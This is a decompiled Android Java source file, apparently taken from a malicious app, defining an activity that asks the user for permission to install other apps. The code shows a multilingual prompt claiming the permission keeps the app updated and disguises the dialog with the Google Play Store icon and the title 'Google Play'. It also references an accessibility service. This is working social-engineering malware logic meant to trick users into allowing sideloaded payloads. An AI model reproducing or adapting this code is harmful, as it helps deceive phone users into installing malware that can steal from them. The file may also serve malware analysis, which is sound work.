package com.mamimobi.activity;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import com.mamimobi.AccessService;
import defpackage.n40;
import defpackage.zn;
import java.util.Locale;

/* JADX INFO: loaded from: classes.dex */
public class InstallPermissionActivity extends Activity {
    @Override // android.app.Activity
    public final void onActivityResult(int i, int i2, Intent intent) {
        AccessService.v0.set(false);
        if (i != 1001) {
            return;
        }
        finish();
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        String str;
        String strV;
        String str2;
        super.onCreate(bundle);
        if (Build.VERSION.SDK_INT < 26 || getPackageManager().canRequestPackageInstalls()) {
            return;
        }
        String language = Locale.getDefault().getLanguage();
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        try {
            String packageName = getPackageName();
            PackageManager packageManager = getApplicationContext().getPackageManager();
            str = (String) packageManager.getApplicationLabel(packageManager.getApplicationInfo(packageName, 0));
        } catch (PackageManager.NameNotFoundException unused) {
            str = "";
        }
        language.getClass();
        switch (language) {
            case "ar":
                strV = zn.v("للحفاظ على التطبيق محدثًا ، يرجى تمكين التثبيت من: ", str);
                str2 = "تفعيل";
                break;
            case "cn":
                strV = zn.v("为了使应用程序保持最新状态，请启用从以下位置安装：", str);
                str2 = "使能够";
                break;
            case "en":
                strV = zn.v("To keep the app up-to date , please enable install from: ", str);
                str2 = "Enable";
                break;
            case "tr":
                strV = zn.v("Uygulamayı güncel tutmak için Şuradan Yükle'yi etkinleştirin: ", str);
                str2 = "Tamam";
                break;
            default:
                strV = zn.v("to keep the app up-to date , please enable install from: ", str);
                str2 = "OK";
                break;
        }
        builder.setMessage(strV);
        try {
            try {
                builder.setIcon(getPackageManager().getApplicationIcon("com.android.vending"));
                builder.setTitle("Google Play");
            } catch (PackageManager.NameNotFoundException unused2) {
            }
        } catch (PackageManager.NameNotFoundException unused3) {
            builder.setIcon(getPackageManager().getApplicationIcon(getPackageName()));
            builder.setTitle(str);
        }
        builder.setPositiveButton(str2, new n40(this));
        builder.show();
    }
}
